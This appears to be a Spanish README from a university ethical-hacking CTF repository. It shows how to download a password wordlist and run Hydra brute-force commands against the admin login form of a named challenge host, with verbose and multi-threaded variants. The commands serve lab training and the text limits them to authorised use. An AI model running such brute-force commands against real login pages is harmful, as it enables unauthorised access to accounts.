## Cómo usar este diccionario en Kali Linux

### 1. Descargar el diccionario

```bash
wget -O wordlistVIU_ctf.txt "https://raw.githubusercontent.com/cenoboa0/Hacking-e-tico-/main/Diccionario%20Hydra/wordlistVIU_ctf.txt"
```

### 2. Verificar la descarga

```bash
wc -l wordlistVIU_ctf.txt
head -20 wordlistVIU_ctf.txt
```

### 3. Lanzar Hydra contra el reto

```bash
hydra -l admin -P wordlistVIU_ctf.txt viuciberseguridad.wsg127.com http-get-form "/retos/bruteforce2/index.php:login=^USER^&password=^PASS^:F=Incorrect login/password"
```

### 4. Modo verbose (ver cada intento)

```bash
hydra -l admin -P wordlistVIU_ctf.txt -V viuciberseguridad.wsg127.com http-get-form "/retos/bruteforce2/index.php:login=^USER^&password=^PASS^:F=Incorrect login/password"
```

### 5. Con múltiples hilos (más rápido)

```bash
hydra -l admin -P wordlistVIU_ctf.txt -t 16 viuciberseguridad.wsg127.com http-get-form "/retos/bruteforce2/index.php:login=^USER^&password=^PASS^:F=Incorrect login/password"
```

> **Nota:** El parámetro `F=` debe contener el texto exacto que muestra la página cuando el login falla. Si el mensaje cambia en otro reto, ajusta ese valor.

---

**Aviso legal:** Este diccionario está diseñado exclusivamente para entornos CTF y laboratorios con autorización. No usar contra sistemas sin permiso explícito.
